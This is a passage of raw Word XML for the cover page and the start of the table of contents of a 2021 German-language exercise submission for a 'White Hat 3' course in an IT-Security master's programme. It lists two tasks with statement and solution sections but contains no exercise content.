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oter4.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.footer+xml"/>
  <Override PartName="/word/header6.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EE28BC" w14:textId="6C616F99" w:rsidR="00191661" w:rsidRPr="00B47CB9" w:rsidRDefault="002F4C53" w:rsidP="000C35CB">
      <w:pPr>
        <w:pStyle w:val="DeckblattSeminararbeit"/>
        <w:rPr>
          <w:color w:val="auto"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc208028689"/>
      <w:bookmarkStart w:id="1" w:name="_Toc213573237"/>
      <w:bookmarkStart w:id="2" w:name="_Toc213573560"/>
      <w:bookmarkStart w:id="3" w:name="_Toc214080642"/>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:color w:val="auto"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Übungsaufgabe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20EE28BD" w14:textId="7680D2FF" w:rsidR="000C35CB" w:rsidRPr="00B47CB9" w:rsidRDefault="000C35CB" w:rsidP="000C35CB">
      <w:pPr>
        <w:pStyle w:val="DeckblattStudiengang"/>
        <w:rPr>
          <w:color w:val="auto"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:color w:val="auto"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">im Studiengang </w:t>
      </w:r>
      <w:r w:rsidR="009A200E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:color w:val="auto"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>IT-Security Master</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20EE28BE" w14:textId="0DBE1647" w:rsidR="009C730A" w:rsidRPr="00B47CB9" w:rsidRDefault="009E7D19" w:rsidP="000C35CB">
      <w:pPr>
        <w:pStyle w:val="DeckblattStudiengang"/>
        <w:rPr>
          <w:color w:val="auto"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:color w:val="auto"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Lehrveranstaltung</w:t>
      </w:r>
      <w:r w:rsidR="009A200E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:color w:val="auto"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> White Hat </w:t>
      </w:r>
      <w:r w:rsidR="00CA3C7C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:color w:val="auto"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20EE28BF" w14:textId="77777777" w:rsidR="006F5B35" w:rsidRPr="00B47CB9" w:rsidRDefault="006F5B35" w:rsidP="006F5B35">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28C0" w14:textId="77777777" w:rsidR="00894018" w:rsidRPr="00B47CB9" w:rsidRDefault="00894018" w:rsidP="006F5B35">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28C1" w14:textId="77777777" w:rsidR="00894018" w:rsidRPr="00B47CB9" w:rsidRDefault="00894018" w:rsidP="006F5B35">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28C2" w14:textId="77777777" w:rsidR="00894018" w:rsidRPr="00B47CB9" w:rsidRDefault="00894018" w:rsidP="006F5B35">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28C3" w14:textId="77777777" w:rsidR="00894018" w:rsidRPr="00B47CB9" w:rsidRDefault="00894018" w:rsidP="006F5B35">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28C4" w14:textId="77777777" w:rsidR="00894018" w:rsidRPr="00B47CB9" w:rsidRDefault="00894018" w:rsidP="006F5B35">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28C5" w14:textId="77777777" w:rsidR="00894018" w:rsidRPr="00B47CB9" w:rsidRDefault="00894018" w:rsidP="006F5B35">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28C6" w14:textId="77777777" w:rsidR="00894018" w:rsidRPr="00B47CB9" w:rsidRDefault="00894018" w:rsidP="006F5B35">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28C7" w14:textId="77777777" w:rsidR="00894018" w:rsidRPr="00B47CB9" w:rsidRDefault="00894018" w:rsidP="006F5B35">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28C8" w14:textId="77777777" w:rsidR="00894018" w:rsidRPr="00B47CB9" w:rsidRDefault="00894018" w:rsidP="006F5B35">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28CB" w14:textId="7FB59E83" w:rsidR="00191661" w:rsidRPr="00B47CB9" w:rsidRDefault="00191661" w:rsidP="00F232C9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="758EF223" w14:textId="07EC0DF2" w:rsidR="009A200E" w:rsidRPr="00B47CB9" w:rsidRDefault="009A200E" w:rsidP="00F232C9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05DFBFAE" w14:textId="73C9239D" w:rsidR="009A200E" w:rsidRPr="00B47CB9" w:rsidRDefault="009A200E" w:rsidP="00F232C9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06684117" w14:textId="6895B6FE" w:rsidR="009A200E" w:rsidRPr="00B47CB9" w:rsidRDefault="009A200E" w:rsidP="00F232C9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="529A0B7C" w14:textId="7AB76C62" w:rsidR="009A200E" w:rsidRPr="00B47CB9" w:rsidRDefault="009A200E" w:rsidP="00F232C9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69C5F1B9" w14:textId="77777777" w:rsidR="009A200E" w:rsidRPr="00B47CB9" w:rsidRDefault="009A200E" w:rsidP="00F232C9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28CC" w14:textId="77777777" w:rsidR="00C15632" w:rsidRPr="00B47CB9" w:rsidRDefault="00C15632" w:rsidP="00F232C9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28CD" w14:textId="77777777" w:rsidR="000C35CB" w:rsidRPr="00B47CB9" w:rsidRDefault="000C35CB" w:rsidP="00F232C9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28CE" w14:textId="77777777" w:rsidR="00787969" w:rsidRPr="00B47CB9" w:rsidRDefault="00787969" w:rsidP="00F232C9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28CF" w14:textId="2695A715" w:rsidR="00191661" w:rsidRPr="00B47CB9" w:rsidRDefault="00894018" w:rsidP="00F232C9">
      <w:pPr>
        <w:pStyle w:val="DeckblattAutor"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="00191661" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>usg</w:t>
      </w:r>
      <w:r w:rsidR="000C35CB" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>eführt von</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="000C35CB" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00ED7762" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Martin Gratt, BSc</w:t>
      </w:r>
      <w:r w:rsidR="000C35CB" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Personenkennzeichen: </w:t>
      </w:r>
      <w:r w:rsidR="00B22ED8" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>1910303050</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20EE28D0" w14:textId="77777777" w:rsidR="00426944" w:rsidRPr="00B47CB9" w:rsidRDefault="00426944" w:rsidP="002E523E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28D1" w14:textId="77777777" w:rsidR="00C15632" w:rsidRPr="00B47CB9" w:rsidRDefault="00C15632" w:rsidP="002E523E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28D2" w14:textId="17A7A9C6" w:rsidR="00426944" w:rsidRPr="00B47CB9" w:rsidRDefault="00191661" w:rsidP="00F232C9">
      <w:pPr>
        <w:pStyle w:val="DeckblattAutor"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">BegutachterIn: </w:t>
      </w:r>
      <w:r w:rsidR="00A15C65" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>DI (FH) Mag. DI Christian Kaufmann</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20EE28D3" w14:textId="77777777" w:rsidR="00426944" w:rsidRPr="00B47CB9" w:rsidRDefault="00426944" w:rsidP="002E523E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28D4" w14:textId="5DA3BD9C" w:rsidR="00787969" w:rsidRPr="00B47CB9" w:rsidRDefault="00787969" w:rsidP="002E523E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28D5" w14:textId="03197227" w:rsidR="000C35CB" w:rsidRPr="00B47CB9" w:rsidRDefault="00873585" w:rsidP="00426944">
      <w:pPr>
        <w:pStyle w:val="DeckblattAutor"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Kirchbichl</w:t>
      </w:r>
      <w:r w:rsidR="00A15C65" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00CA3C7C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="00613CA4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00A15C65" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidR="00CA3C7C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00A15C65" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.202</w:t>
      </w:r>
      <w:r w:rsidR="00CA3C7C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20EE28D6" w14:textId="77777777" w:rsidR="0076111C" w:rsidRPr="00B47CB9" w:rsidRDefault="0076111C" w:rsidP="00191661">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28D7" w14:textId="77777777" w:rsidR="0076111C" w:rsidRPr="00B47CB9" w:rsidRDefault="0076111C" w:rsidP="00191661">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EE28D8" w14:textId="77777777" w:rsidR="0076111C" w:rsidRPr="00B47CB9" w:rsidRDefault="0076111C" w:rsidP="00191661">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:sectPr w:rsidR="0076111C" w:rsidRPr="00B47CB9" w:rsidSect="00361E8A">
          <w:headerReference w:type="even" r:id="rId8"/>
          <w:headerReference w:type="default" r:id="rId9"/>
          <w:footerReference w:type="even" r:id="rId10"/>
          <w:footerReference w:type="default" r:id="rId11"/>
          <w:headerReference w:type="first" r:id="rId12"/>
          <w:footerReference w:type="first" r:id="rId13"/>
          <w:pgSz w:w="11906" w:h="16838" w:code="9"/>
          <w:pgMar w:top="1985" w:right="1418" w:bottom="3402" w:left="1418" w:header="709" w:footer="709" w:gutter="0"/>
          <w:cols w:space="708"/>
          <w:titlePg/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:bookmarkEnd w:id="0"/>
    <w:bookmarkEnd w:id="1"/>
    <w:bookmarkEnd w:id="2"/>
    <w:bookmarkEnd w:id="3"/>
    <w:p w14:paraId="20EE28E5" w14:textId="3BEDF66D" w:rsidR="001A1408" w:rsidRPr="00B47CB9" w:rsidRDefault="00D416AA" w:rsidP="00D416AA">
      <w:pPr>
        <w:pStyle w:val="Startberschrift"/>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:lastRenderedPageBreak/>
        <w:t>Inhaltsverzeichnis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20EE28E6" w14:textId="77777777" w:rsidR="001A1408" w:rsidRPr="00B47CB9" w:rsidRDefault="001A1408" w:rsidP="001A1408">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="323E2293" w14:textId="47023EDF" w:rsidR="008778DD" w:rsidRDefault="009C4F64">
      <w:pPr>
        <w:pStyle w:val="Verzeichnis1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:bCs w:val="0"/>
          <w:noProof/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:caps/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:caps/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:caps/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:hyperlink w:anchor="_Toc62994611" w:history="1">
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>Aufgabe 1 (4P)</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc62994611 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A0623">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>3</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="14C12A4F" w14:textId="4711D290" w:rsidR="008778DD" w:rsidRDefault="00DE67E4">
      <w:pPr>
        <w:pStyle w:val="Verzeichnis2"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="960"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9060"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:bCs w:val="0"/>
          <w:noProof/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc62994612" w:history="1">
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>1.1</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:szCs w:val="22"/>
            <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>Angabe</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc62994612 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A0623">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>3</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5180E86C" w14:textId="3549E058" w:rsidR="008778DD" w:rsidRDefault="00DE67E4">
      <w:pPr>
        <w:pStyle w:val="Verzeichnis2"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="960"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9060"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:bCs w:val="0"/>
          <w:noProof/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc62994613" w:history="1">
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>1.2</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:szCs w:val="22"/>
            <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>Lösung</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc62994613 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A0623">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="59615B43" w14:textId="523E1D09" w:rsidR="008778DD" w:rsidRDefault="00DE67E4">
      <w:pPr>
        <w:pStyle w:val="Verzeichnis1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:bCs w:val="0"/>
          <w:noProof/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc62994614" w:history="1">
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>Aufgabe 2 (2P)</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc62994614 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A0623">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>26</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="06F705FD" w14:textId="1BBA12B1" w:rsidR="008778DD" w:rsidRDefault="00DE67E4">
      <w:pPr>
        <w:pStyle w:val="Verzeichnis2"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="960"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9060"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:bCs w:val="0"/>
          <w:noProof/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc62994615" w:history="1">
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>2.1</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:szCs w:val="22"/>
            <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>Angabe</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
